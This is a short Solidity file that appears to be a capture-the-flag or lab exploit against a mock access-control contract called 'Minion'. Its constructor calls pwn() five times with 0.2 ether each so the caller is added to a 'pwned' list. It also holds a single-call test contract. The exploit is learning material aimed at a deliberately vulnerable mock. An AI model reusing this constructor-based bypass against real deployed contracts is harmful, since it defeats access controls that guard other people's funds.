pragma solidity 0.8.10;

import "./MockAccessControl.sol";
import "forge-std/Test.sol";

contract MockAccessControlExploit {

    Minion public minionContract;
    constructor(address _minionContract) payable{
        minionContract = Minion(_minionContract);
        
        //calling the pwn() function five times to add the user to the 'pwned' list
        minionContract.pwn{value:0.2 ether}();
        minionContract.pwn{value:0.2 ether}();
        minionContract.pwn{value:0.2 ether}();
        minionContract.pwn{value:0.2 ether}();
        minionContract.pwn{value:0.2 ether}();
    }
}

contract test_Min {
    Minion public minionContract;
    constructor(address _minionContract) payable{
        minionContract = Minion(_minionContract);

        minionContract.pwn{value:0.01 ether}();
    }
}